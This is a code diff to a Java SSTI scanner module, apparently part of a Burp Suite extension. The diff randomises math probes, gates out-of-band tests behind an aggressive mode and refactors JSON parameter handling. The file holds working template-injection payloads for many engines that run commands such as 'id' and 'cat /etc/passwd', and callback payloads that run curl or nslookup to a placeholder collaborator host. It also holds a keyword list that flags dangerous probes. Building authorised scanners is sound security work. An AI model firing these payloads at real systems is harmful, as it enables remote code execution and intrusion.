@@ -9,14 +9,17 @@ import burp.api.montoya.collaborator.InteractionType;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.JsonScanSupport;
 import com.omnistrike.framework.PayloadEncoder;
 import com.omnistrike.framework.ResponseGuard;
+import com.omnistrike.framework.ScanTargetIdentity;
 
 import com.omnistrike.model.*;
 
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ThreadLocalRandom;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Pattern;
 
@@ -33,7 +36,7 @@ public class SstiScanner implements ScanModule {
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
     // Parameters confirmed exploitable via OOB — skip all remaining phases for these
-    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
+    private final Set<String> oobConfirmedTargets = ConcurrentHashMap.newKeySet();
 
     private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
 
@@ -52,7 +55,7 @@ public class SstiScanner implements ScanModule {
             {"[[${133*991}]]", SSTI_EXPECTED, "Thymeleaf inline"},
             {"{{= 133*991}}", SSTI_EXPECTED, "doT.js"},
             {"<#assign x=133*991>${x}", SSTI_EXPECTED, "Freemarker assign"},
-            {"${T(java.lang.Math).random()}", "", "Spring EL (any numeric output)"},
+            {"${T(java.lang.Math).multiplyExact(137,997)}", "136589", "Spring Expression Language"},
             {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty (if conditional)"},
             {"@(133*991)", SSTI_EXPECTED, "Razor (.NET)"},
             {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
@@ -101,9 +104,11 @@ public class SstiScanner implements ScanModule {
                 {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
                 // Dropped: reduce filter probe — "omnistrike" too easily appears via reflection
         });
+        ENGINE_PROBES.put("Spring Expression Language", new String[][]{
+                {"${T(java.lang.Math).multiplyExact(137,997)}", "136589", "Spring EL type access"},
+        });
         ENGINE_PROBES.put("Freemarker", new String[][]{
                 // Dropped: ${.version} → "2." matches any decimal anywhere on the page
-                {"${133*991}", SSTI_EXPECTED, "Freemarker eval"},
                 {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "freemarker.template.utility.ObjectConstructor@", "Freemarker OC"}, // toString() includes @hash
                 {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
         });
@@ -117,17 +122,14 @@ public class SstiScanner implements ScanModule {
                 {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "java.lang.UNIXProcess@|java.lang.ProcessImpl@|Process[pid=", "Thymeleaf RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Mako", new String[][]{
-                {"${133*991}", SSTI_EXPECTED, "Mako eval"},
                 {"${self.module.__builtins__}", "<module 'builtins'|{'__name__': 'builtins'", "Mako builtins access"}, // repr of builtins module
                 {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("ERB", new String[][]{
-                {"<%= 133*991 %>", SSTI_EXPECTED, "ERB eval"},
                 // Dropped: Dir.entries('/') → "[" — useless single-character match
                 {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Pug", new String[][]{
-                {"#{133*991}", SSTI_EXPECTED, "Pug eval"},
                 {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Handlebars", new String[][]{
@@ -149,7 +151,6 @@ public class SstiScanner implements ScanModule {
                 {"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Nunjucks", new String[][]{
-                {"{{133*991}}", SSTI_EXPECTED, "Nunjucks eval"},
                 {"{{range.constructor(\"return 133*991\")()}}", SSTI_EXPECTED, "Nunjucks constructor eval"},
                 {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
         });
@@ -165,7 +166,6 @@ public class SstiScanner implements ScanModule {
                 {"@System.Diagnostics.Process.Start(\"id\")", "System.Diagnostics.Process (id)", "Razor RCE (AGGRESSIVE)"}, // Process.ToString() format
         });
         ENGINE_PROBES.put("EJS", new String[][]{
-                {"<%= 133*991 %>", SSTI_EXPECTED, "EJS eval"},
                 {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
         });
         // Mustache: dropped entirely — only probe was {{#list}}test{{/list}} → "test|list",
@@ -176,17 +176,10 @@ public class SstiScanner implements ScanModule {
                 {"{% assign x = 133 %}{{ x | times: 991 }}", SSTI_EXPECTED, "Liquid assign + filter"},
         });
         ENGINE_PROBES.put("Blade", new String[][]{
-                {"{{ 133*991 }}", SSTI_EXPECTED, "Laravel Blade double curly"},
                 {"{!! 133*991 !!}", SSTI_EXPECTED, "Blade unescaped output"},
                 {"@php echo 133*991; @endphp", SSTI_EXPECTED, "Blade PHP block (AGGRESSIVE)"},
         });
-        ENGINE_PROBES.put("Plates", new String[][]{
-                {"<?= 133*991 ?>", SSTI_EXPECTED, "Plates short echo"},
-                // Dropped: $this->e('omnistrike_confirm') — expected is a substring of the payload, so
-                // a sanitizer that strips PHP tags but keeps the string content trivially FPs.
-        });
         ENGINE_PROBES.put("Groovy", new String[][]{
-                {"${133*991}", SSTI_EXPECTED, "Groovy GString"},
                 {"<% println 133*991 %>", SSTI_EXPECTED, "Groovy template"},
                 {"${\"cat /etc/passwd\".execute().text}", "root:x:0:0:", "Groovy RCE (AGGRESSIVE)"}, // tightened: require full passwd marker, not bare "root:"
         });
@@ -215,9 +208,6 @@ public class SstiScanner implements ScanModule {
             Map.entry("Blade", Pattern.compile("Blade.*error|(?:Blade|Laravel).*View.*not found|(?:Blade|Laravel).*Undefined variable", Pattern.CASE_INSENSITIVE)),
             Map.entry("Groovy", Pattern.compile("groovy\\.lang|GroovyRuntimeException|MissingMethodException", Pattern.CASE_INSENSITIVE))
     );
-
-    // Spring EL T(java.lang.Math).random() leaks a 0.<many digits> float.
-    private static final Pattern SPRING_RANDOM_PATTERN = Pattern.compile("0\\.\\d{10,}");
 
     // OOB SSTI payloads for Collaborator-based blind detection
     // Each template engine has DNS (nslookup) AND HTTP (curl/wget) variants.
@@ -291,9 +281,7 @@ public class SstiScanner implements ScanModule {
         {"<%= process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl execSync)"},
         {"<%= require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl require)"},
         // Django / Python (limited — Django templates are sandboxed, but custom template tags or debug mode may allow execution)
-        {"{% load log %}{% get_admin_log 10 as entries %}{% for e in entries %}{{e}}{% endfor %}", "Django OOB (admin log exfil)"},
         // Additional Jinja2 OOB variants — DNS
-        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subclass 287)"},
         {"{{lipsum.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (lipsum globals)"},
         {"{{cycler.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (cycler)"},
         {"{{joiner.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (joiner)"},
@@ -302,15 +290,11 @@ public class SstiScanner implements ScanModule {
         {"{{lipsum.__globals__['os'].popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (lipsum curl)"},
         {"{{cycler.__init__.__globals__.os.popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (cycler curl)"},
         // Additional Smarty OOB variants
-        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system direct)"},
-        {"{Smarty_Internal_Write_File::writeFile('/tmp/x','test',self::clearConfig())}", "Smarty OOB (file write)"},
         // Additional Twig OOB variants — DNS
         {"{{['nslookup COLLAB_PLACEHOLDER']|filter('exec')}}", "Twig OOB (exec filter)"},
         // Additional Twig OOB variants — HTTP (Custom OOB compatible)
         {"{{['curl http://COLLAB_PLACEHOLDER/ssti']|filter('exec')}}", "Twig OOB (curl exec)"},
         // Additional ERB OOB variants
-        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick alt)"},
-        {"<%= `curl http://COLLAB_PLACEHOLDER/ssti` %>", "ERB OOB (curl backtick alt)"},
         // Groovy OOB — DNS
         {"${\"nslookup COLLAB_PLACEHOLDER\".execute()}", "Groovy OOB (execute)"},
         // Groovy OOB — HTTP (Custom OOB compatible)
@@ -361,7 +345,7 @@ public class SstiScanner implements ScanModule {
         HttpRequest request = requestResponse.request();
         String urlPath = extractPath(request.url());
         List<InjectionTarget> targets = extractTargets(request);
-        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
+        targets.removeIf(t -> !t.matchesParameterName(targetParameterName));
         return runSstiTargets(requestResponse, targets, urlPath);
     }
 
@@ -377,7 +361,8 @@ public class SstiScanner implements ScanModule {
                                           List<InjectionTarget> targets, String urlPath) {
         for (InjectionTarget target : targets) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
-            if (!dedup.markIfNew("ssti-scanner", urlPath, target.name)) continue;
+            if (!dedup.markIfNewRaw("ssti-scanner:"
+                    + scanTargetKey(requestResponse.request(), target))) continue;
 
             try {
                 testSsti(requestResponse, target);
@@ -395,15 +380,10 @@ public class SstiScanner implements ScanModule {
     private void testSsti(HttpRequestResponse original, InjectionTarget target) throws InterruptedException {
         String url = original.request().url();
         boolean aggressiveMode = config.getBool("ssti.aggressive", false);
-
-        // Step 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
-        // Send all engine OOB payloads unconditionally (engine=null → sends all)
-        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
-            testOobSsti(original, target, null);
-        }
+        boolean oobEnabled = aggressiveMode && config.getBool("ssti.oob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable();
 
         // Get baseline response
-        if (oobConfirmedParams.contains(target.name)) return;
         HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
         if (baseline == null || baseline.response() == null) return;
         String baselineBody = baseline.response().bodyToString();
@@ -433,14 +413,17 @@ public class SstiScanner implements ScanModule {
         }
 
         // Step 3: Math evaluation probes
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         boolean templateConfirmed = false;
 
         for (String[] probe : POLYGLOT_PROBES) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            String payload = probe[0];
-            String expected = probe[1];
-            String engineHint = probe[2];
+            ProbeInstance instance = instantiatePolyglot(probe);
+            String payload = instance.payload();
+            String expected = instance.expected();
+            String engineHint = instance.engineHint();
+
+            if (!aggressiveMode && isAggressivePolyglot(payload)) continue;
 
 
             HttpRequestResponse result = sendPayload(original, target, payload);
@@ -453,74 +436,42 @@ public class SstiScanner implements ScanModule {
             String responseBody = result.response().bodyToString();
             if (responseBody == null) responseBody = "";
 
-            // Special case: Spring EL returns random number
-            if (payload.contains("T(java.lang.Math).random()")) {
-                if (SPRING_RANDOM_PATTERN.matcher(responseBody).find()
-                        && !SPRING_RANDOM_PATTERN.matcher(baselineBody).find()) {
-                    templateConfirmed = true;
-                    findingsStore.addFinding(Finding.builder("ssti-scanner",
-                                    "SSTI Confirmed: Spring Expression Language",
-                                    Severity.HIGH, Confidence.CERTAIN)
-                            .url(url).parameter(target.name)
-                            .evidence("Payload: " + payload + " | Random number appeared in response")
-                            .description("Spring EL injection confirmed via Math.random() execution.")
-                            .requestResponse(result)
-                            .payload(payload)
-                            .build());
-                    break;
-                }
-                continue;
-            }
-
             // Check if expected result appears in response but NOT in baseline
             // Support OR matching: "A|B|C" means any of A, B, C must be found
             // Guard: if baseline is empty, skip math-result checks (e.g., "49") to avoid FPs
-            boolean expectedFound = false;
-            if (!expected.isEmpty()) {
-                boolean baselineEmpty = baselineBody.isEmpty();
-                if (expected.contains("|")) {
-                    for (String exp : expected.split("\\|")) {
-                        String trimmed = exp.trim();
-                        if (baselineEmpty && trimmed.matches("\\d+")) continue; // Skip numeric matches on empty baseline
-                        if (responseBody.contains(trimmed) && !baselineBody.contains(trimmed)) {
-                            expectedFound = true;
-                            break;
-                        }
-                    }
-                } else {
-                    if (baselineEmpty && expected.matches("\\d+")) {
-                        // Don't trust numeric matches (like "49") when baseline is empty
-                        expectedFound = false;
-                    } else {
-                        expectedFound = responseBody.contains(expected) && !baselineBody.contains(expected);
-                    }
-                }
-            }
-            if (expectedFound) {
+            String matchedToken = matchExpected(responseBody, baselineBody, payload, expected);
+            if (matchedToken != null) {
                 // Verify template syntax was consumed — if the raw payload appears verbatim
                 // in the response, the server is just reflecting input, not evaluating it.
                 // The expected value may coincidentally exist elsewhere on the page.
                 boolean syntaxConsumed = !responseBody.contains(payload);
-                if (!syntaxConsumed) continue;  // Raw payload reflected = not evaluated
+                if (!syntaxConsumed || payload.contains(matchedToken)) continue;
 
                 // Additional check: the expected value must not be a substring of the payload
                 // (e.g., if payload is "{{131803}}" and expected is "131803", the server might
                 // just be stripping the braces). Verify result appears in a different context.
                 // Skip if expected appears ONLY adjacent to remnants of the payload syntax.
 
+                HttpRequestResponse confirmation = sendPayload(original, target, payload);
+                if (confirmation == null || confirmation.response() == null
+                        || confirmation.response().statusCode() >= 400) continue;
+                String confirmationBody = confirmation.response().bodyToString();
+                if (!matchedToken.equals(matchExpected(
+                        confirmationBody, baselineBody, payload, expected))) continue;
+
                 templateConfirmed = true;
 
                 findingsStore.addFinding(Finding.builder("ssti-scanner",
                                 "SSTI Detected: " + engineHint + " template evaluation",
-                                Severity.HIGH, Confidence.FIRM)
+                                Severity.HIGH, Confidence.CERTAIN)
                         .url(url).parameter(target.name)
                         .evidence("Payload: " + payload + " | Expected: " + expected
                                 + " found in response (template syntax consumed)")
                         .description("Template expression was evaluated — the template syntax was consumed "
                                 + "and replaced with the computed result. Engine hint: " + engineHint)
-                        .requestResponse(result)
+                        .requestResponse(confirmation)
                         .payload(payload)
-                        .responseEvidence(expected)
+                        .responseEvidence(matchedToken)
                         .build());
                 break;
             }
@@ -529,17 +480,71 @@ public class SstiScanner implements ScanModule {
         }
 
         // Step 4: Engine identification (if template evaluation confirmed)
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         String identifiedEngine = null;
         if (templateConfirmed) {
             identifiedEngine = identifyEngine(original, target, baselineBody, aggressiveMode);
         }
 
-        // Step 5: Targeted OOB for identified engine (refines the initial blanket OOB from Step 1)
-        if (oobConfirmedParams.contains(target.name)) return;
-        if (identifiedEngine != null && collaboratorManager != null && collaboratorManager.isAvailable()) {
+        // Step 5: OOB is aggressive and runs only after safe direct probes. If the
+        // engine is known, send only its payloads; otherwise use the deduplicated fallback battery.
+        if (isOobConfirmed(original, target)) return;
+        if (oobEnabled) {
             testOobSsti(original, target, identifiedEngine);
         }
+    }
+
+    private record ProbeInstance(String payload, String expected, String engineHint) {}
+
+    private static ProbeInstance instantiatePolyglot(String[] probe) {
+        String payload = probe[0];
+        String expected = probe[1];
+        if (SSTI_EXPECTED.equals(expected)) {
+            int a = ThreadLocalRandom.current().nextInt(113, 997);
+            int b = ThreadLocalRandom.current().nextInt(113, 997);
+            String product = String.valueOf((long) a * b);
+            payload = payload
+                    .replace("133 * 991", a + " * " + b)
+                    .replace("133.*(991)", a + ".*(" + b + ")")
+                    .replace("133 | times: 991", a + " | times: " + b)
+                    .replace("131000+803", a + "*" + b)
+                    .replace("133*991", a + "*" + b)
+                    .replace(SSTI_EXPECTED, product);
+            expected = product;
+        }
+        return new ProbeInstance(payload, expected, probe[2]);
+    }
+
+    static String matchExpected(String body, String baselineBody,
+                                        String payload, String expected) {
+        if (body == null || expected == null || expected.isEmpty() || body.contains(payload)) return null;
+        String baseline = baselineBody == null ? "" : baselineBody;
+        for (String candidate : expected.split("\\|")) {
+            String token = candidate.trim();
+            if (token.isEmpty() || payload.contains(token)) continue;
+            if (baseline.isEmpty() && token.matches("\\d+")) continue;
+            if (body.contains(token) && !baseline.contains(token)) return token;
+        }
+        return null;
+    }
+
+    static boolean isAggressivePolyglot(String payload) {
+        String lower = payload.toLowerCase(Locale.ROOT);
+        return lower.contains("utility.execute") || lower.contains("execsync")
+                || lower.contains("constructor.constructor") || lower.contains("range.constructor")
+                || lower.contains("{php}") || lower.contains("{% debug %}")
+                || lower.contains("popen(") || lower.contains("system(");
+    }
+
+    static boolean isAggressiveEngineProbe(String payload, String description) {
+        String probe = (payload + " " + description).toLowerCase(Locale.ROOT);
+        return probe.contains("aggressive") || probe.contains("objectconstructor")
+                || probe.contains("request.environ") || probe.contains("__globals__")
+                || probe.contains("__subclasses__") || probe.contains("__builtins__")
+                || probe.contains("get_admin_log") || probe.contains("dump(app")
+                || probe.contains("runtime") || probe.contains("processbuilder")
+                || probe.contains("popen(") || probe.contains("system(")
+                || probe.contains("phpinfo") || probe.contains("directoryiterator");
     }
 
     private String identifyEngine(HttpRequestResponse original, InjectionTarget target,
@@ -557,8 +562,9 @@ public class SstiScanner implements ScanModule {
                 String expected = probe[1];
                 String desc = probe[2];
 
-                // Skip aggressive payloads unless aggressive mode is enabled
-                if (desc.contains("AGGRESSIVE") && !aggressiveMode) continue;
+                // Safe mode must not execute commands, enumerate classes/runtime objects,
+                // or disclose application configuration while identifying an engine.
+                if (!aggressiveMode && isAggressiveEngineProbe(payload, desc)) continue;
 
                 try {
 
@@ -619,7 +625,7 @@ public class SstiScanner implements ScanModule {
                                         + ". " + desc + ".")
                                 .requestResponse(result)
                                 .payload(payload)
-                                .responseEvidence(expected)
+                                .responseEvidence(matchedToken)
                                 .build());
                         return engine; // Engine identified, done
                     }
@@ -636,11 +642,13 @@ public class SstiScanner implements ScanModule {
 
     private void testOobSsti(HttpRequestResponse original, InjectionTarget target, String identifiedEngine) {
         String url = original.request().url();
+        Set<String> sentTemplates = new HashSet<>();
         for (String[] payloadInfo : OOB_SSTI_PAYLOADS) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            if (oobConfirmedParams.contains(target.name)) return;
+            if (isOobConfirmed(original, target)) return;
             String payloadTemplate = payloadInfo[0];
             String technique = payloadInfo[1];
+            if (!payloadTemplate.contains("COLLAB_PLACEHOLDER") || !sentTemplates.add(payloadTemplate)) continue;
 
             // If engine was identified, only send OOB payloads for that engine and related engines
             if (identifiedEngine != null) {
@@ -655,13 +663,14 @@ public class SstiScanner implements ScanModule {
                 }
                 // Spring EL apps often use Thymeleaf as the view layer
                 if (!match && engineLower.contains("spring")) {
-                    match = techLower.contains("thymeleaf");
+                    match = techLower.contains("thymeleaf") || techLower.contains("spring el");
                 }
                 if (!match) continue;
             }
 
             // AtomicReference to capture the sent request/response for the finding
             AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+            AtomicReference<String> sentPayload = new AtomicReference<>();
 
             String collabPayload = collaboratorManager.generatePayload(
                     "ssti-scanner", url, target.name,
@@ -675,7 +684,7 @@ public class SstiScanner implements ScanModule {
                         }
                         // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                         if (interaction.type() == InteractionType.HTTP) {
-                            oobConfirmedParams.add(target.name);
+                            oobConfirmedTargets.add(scanTargetKey(original.request(), target));
                         }
                         findingsStore.addFinding(Finding.builder("ssti-scanner",
                                         "SSTI Confirmed (Out-of-Band) - " + technique,
@@ -689,7 +698,7 @@ public class SstiScanner implements ScanModule {
                                         + "The template engine executed the injected command, triggering a "
                                         + interaction.type().name() + " callback.")
                                 .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
-                                .payload(payloadTemplate)
+                                .payload(sentPayload.get())
                                 .build());
                         api.logging().logToOutput("[SSTI OOB] Confirmed! " + technique
                                 + " at " + url + " param=" + target.name);
@@ -698,6 +707,7 @@ public class SstiScanner implements ScanModule {
 
             if (collabPayload == null) continue;
             String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
+            sentPayload.set(payload);
 
             try {
                 sentRequest.set(sendPayload(original, target, payload));
@@ -732,53 +742,12 @@ public class SstiScanner implements ScanModule {
             case COOKIE:
                 return PayloadEncoder.injectCookie(request, target.name, payload);
             case JSON:
-                String body = request.bodyToString();
-                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
-                if (target.name.contains(".")) {
-                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
-                    String newBody = replaceNestedJsonValue(body, target.name, payload);
-                    return request.withBody(newBody);
-                } else {
-                    String jsonPattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
-                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
-                    String newBody = body.replaceFirst(jsonPattern, java.util.regex.Matcher.quoteReplacement(replacement));
-                    return request.withBody(newBody);
-                }
+                return request.withBody(JsonScanSupport.replaceValue(
+                        request.bodyToString(), target.jsonPath, payload));
             case HEADER:
                 return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
             default:
                 return request;
-        }
-    }
-
-    /**
-     * Replace a value at a dot-notation path in a JSON string.
-     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
-     */
-    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
-        try {
-            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
-            if (!root.isJsonObject()) return jsonBody;
-
-            String[] parts = dotPath.split("\\.");
-            com.google.gson.JsonObject current = root.getAsJsonObject();
-
-            // Traverse to the parent of the target key
-            for (int i = 0; i < parts.length - 1; i++) {
-                com.google.gson.JsonElement child = current.get(parts[i]);
-                if (child == null || !child.isJsonObject()) return jsonBody;
-                current = child.getAsJsonObject();
-            }
-
-            // Replace the leaf value
-            String leafKey = parts[parts.length - 1];
-            if (current.has(leafKey)) {
-                current.addProperty(leafKey, escapedValue);
-            }
-
-            return new com.google.gson.Gson().toJson(root);
-        } catch (Exception e) {
-            return jsonBody;
         }
     }
 
@@ -802,13 +771,13 @@ public class SstiScanner implements ScanModule {
         for (var h : request.headers()) {
             if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
         }
-        if (ct.contains("application/json")) {
+        if (ct.toLowerCase(Locale.ROOT).contains("application/json")) {
             try {
                 String body = request.bodyToString();
                 if (body != null) {
-                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
-                    if (el.isJsonObject()) {
-                        extractJsonParams(el.getAsJsonObject(), "", targets);
+                    for (JsonScanSupport.Target jsonTarget : JsonScanSupport.extractTargets(body)) {
+                        targets.add(new InjectionTarget(jsonTarget.displayName(), jsonTarget.value(),
+                                TargetType.JSON, jsonTarget.path()));
                     }
                 }
             } catch (Exception ignored) {}
@@ -819,6 +788,8 @@ public class SstiScanner implements ScanModule {
                 "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                 "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                 "upgrade-insecure-requests", "if-modified-since", "if-none-match",
+                "authorization", "proxy-authorization", "content-type", "accept",
+                "accept-language", "cache-control", "pragma", "origin",
                 "cookie"); // individual cookies already extracted as COOKIE parameters
         for (var h : request.headers()) {
             if (!skipHeaders.contains(h.name().toLowerCase())) {
@@ -827,21 +798,6 @@ public class SstiScanner implements ScanModule {
         }
 
         return targets;
-    }
-
-    /**
-     * Recursively extract JSON parameters using dot-notation for nested objects.
-     */
-    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionTarget> targets) {
-        for (String key : obj.keySet()) {
-            com.google.gson.JsonElement val = obj.get(key);
-            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
-            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
-                targets.add(new InjectionTarget(fullKey, val.getAsString(), TargetType.JSON));
-            } else if (val.isJsonObject()) {
-                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
-            }
-        }
     }
 
     private String extractPath(String url) {
@@ -853,20 +809,62 @@ public class SstiScanner implements ScanModule {
         return url;
     }
 
+    private boolean isOobConfirmed(HttpRequestResponse original, InjectionTarget target) {
+        // An explicit manual rescan must not be short-circuited by a previous callback.
+        if (dedup != null && dedup.isBypass()) return false;
+        return oobConfirmedTargets.contains(scanTargetKey(original.request(), target));
+    }
+
+    private static String scanTargetKey(HttpRequest request, InjectionTarget target) {
+        return ScanTargetIdentity.build(request.url(), request.method(),
+                target.type.name(), target.identityName());
+    }
+
     private void perHostDelay() throws InterruptedException {
         int delay = config.getInt("ssti.perHostDelay", 500);
         if (delay > 0) Thread.sleep(delay);
     }
 
     @Override
-    public void destroy() { tested.clear(); }
+    public void destroy() {
+        tested.clear();
+        oobConfirmedTargets.clear();
+    }
 
     private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }
 
     private static class InjectionTarget {
         final String name, originalValue;
         final TargetType type;
-        InjectionTarget(String n, String v, TargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
+        final List<Object> jsonPath;
+        InjectionTarget(String n, String v, TargetType t) { this(n, v, t, null); }
+        InjectionTarget(String n, String v, TargetType t, List<Object> jsonPath) {
+            name = n;
+            originalValue = v != null ? v : "";
+            type = t;
+            this.jsonPath = jsonPath == null ? null : List.copyOf(jsonPath);
+        }
+        String identityName() {
+            if (jsonPath == null) return name;
+            StringBuilder out = new StringBuilder();
+            for (Object part : jsonPath) {
+                if (part instanceof String key) {
+                    out.append('/').append(key.replace("~", "~0").replace("/", "~1"));
+                } else {
+                    out.append('/').append(part);
+                }
+            }
+            return out.toString();
+        }
+        boolean matchesParameterName(String requested) {
+            if (requested == null) return false;
+            if (name.equalsIgnoreCase(requested)) return true;
+            if (jsonPath != null && !jsonPath.isEmpty()
+                    && jsonPath.get(jsonPath.size() - 1) instanceof String key) {
+                return key.equalsIgnoreCase(requested);
+            }
+            return false;
+        }
     }
 
     public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
